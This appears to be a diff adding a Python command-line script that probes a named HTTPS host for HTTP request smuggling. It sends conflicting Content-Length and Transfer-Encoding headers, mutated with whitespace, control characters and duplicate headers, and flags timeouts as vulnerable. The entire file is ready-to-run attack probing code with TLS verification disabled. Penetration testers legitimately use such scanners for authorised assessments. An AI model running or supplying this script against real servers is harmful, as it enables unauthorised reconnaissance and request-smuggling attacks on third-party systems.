@@ -1,0 +1,143 @@
+#!/bin/python
+import socket
+import ssl
+import sys
+import select
+
+
+#context = ssl.create_default_context()
+
+
+#request  = "POST / HTTP/1.1\r\n"
+#request += "Host: %s\r\n" % hostname
+#request += "Content-Length: 4\r\n"
+#request += "Transfer-Encoding: Chunked\r\n"
+#request += "\r\n"
+
+#sanitize  = "POST / HTTP/1.1\r\n"
+#sanitize += "Host: %s\r\n" % hostname
+#sanitize += "Connection: Close\r\n"
+#sanitize += "Transfer-Encoding: Chunked\r\n"
+#sanitize += "\r\n"
+
+
+def test_clte(hostname, clte, timeout=1):
+    context = ssl._create_unverified_context()
+    sock = socket.create_connection((hostname, 443))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+
+    request  = "POST / HTTP/1.1\r\n"
+    request += "Host: %s\r\n" % hostname
+    #request += "Content-Length: 4\r\n"
+    #request += "Transfer-Encoding: Chunked\r\n"
+    request += (clte % 4)
+    request += "\r\n"
+
+    ssock.write(request.encode("utf8"))
+    ssock.write("1\r\nA\r\n".encode("utf8"))
+    ssock.write("Q".encode("utf8"))
+
+    #Wating for response
+    r_list,_,_ = select.select([ssock],[],[],timeout)
+    if len(r_list) == 0:
+        print ("CLTE Timed Out", escape_clte(clte))
+        return True # Vulnerable
+
+    data = ssock.recv(1024)
+    #print(data.decode("utf8"))
+
+    return False
+
+
+def test_tecl(hostname, clte,timeout=1):
+    context = ssl._create_unverified_context()
+    sock = socket.create_connection((hostname, 443))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+
+    request  = "POST / HTTP/1.1\r\n"
+    request += "Host: %s\r\n" % hostname
+    #request += "Content-Length: 6\r\n"
+    #request += "Transfer-Encoding: Chunked\r\n"
+    request += (clte % 6)
+    request += "\r\n"
+
+    ssock.write(request.encode("utf8"))
+    ssock.write("0\r\n\r\n".encode("utf8"))
+    ssock.write("Q".encode("utf8"))
+
+    #Wating for response
+    r_list,_,_ = select.select([ssock],[],[],timeout)
+    if len(r_list) == 0:
+        print ("TECL Timed Out", escape_clte(clte))
+        return True # Vulnerable
+
+    data = ssock.recv(1024)
+    #print(data.decode("utf8"))
+
+    return False
+
+white_spaces = ["", "  ", "x"] + list(map(chr, range(0x21)))
+
+def escape_clte(s):
+    for w in white_spaces:
+        if len(w) == 1 and w != " ":
+            s = s.replace(w, "\\x%02x" % ord(w))
+
+    return s
+
+def replace(s, old, new_list):
+    s = s.split(old)
+    for i in range(len(s)-1):
+        for new in new_list:
+            yield old.join(s[:i+1]) + new + old.join(s[i+1:])
+
+def replace_white_spaces(s):
+    for w in white_spaces:
+        yield w+s
+        yield s+w
+
+    for x in replace(s, " ", white_spaces):
+        yield x
+    for x in replace(s, "\r", white_spaces):
+        yield x
+    for x in replace(s, "\n", white_spaces):
+        yield x
+
+def replace_dash(s):
+    dashes = ["_"]
+    for w in white_spaces:
+        dashes += ["-"+w, "_"+w]
+    for x in replace(s, "-", dashes):
+        yield x
+
+def cases(s):
+        yield s.upper()
+        yield s.lower()
+
+
+mutations = [
+    replace_white_spaces,
+    replace_dash,
+]
+
+cltefs = [
+    "Content-Length: %d\r\nTransfer-Encoding: Chunked\r\n",
+    "Transfer-Encoding: Chunked\r\nContent-Length: %d\r\n",
+    "Content-Length: %d\r\nTransfer-Encoding: asd\r\nTransfer-Encoding: Chunked\r\n",
+    "Content-Length: %d\r\nTransfer-Encoding: Chunked\r\nTransfer-Encoding: asd\r\n",
+]
+
+if len(sys.argv) != 2:
+    print("usage: %s hostname" % sys.argv[0])
+    sys.exit(1)
+
+hostname = sys.argv[1]
+timeout = 5
+for cltef in cltefs:
+    for mut in mutations:
+        for clte in mut(cltef):
+            test_clte(hostname, clte, timeout)
+            test_tecl(hostname, clte, timeout)
+        
+
+
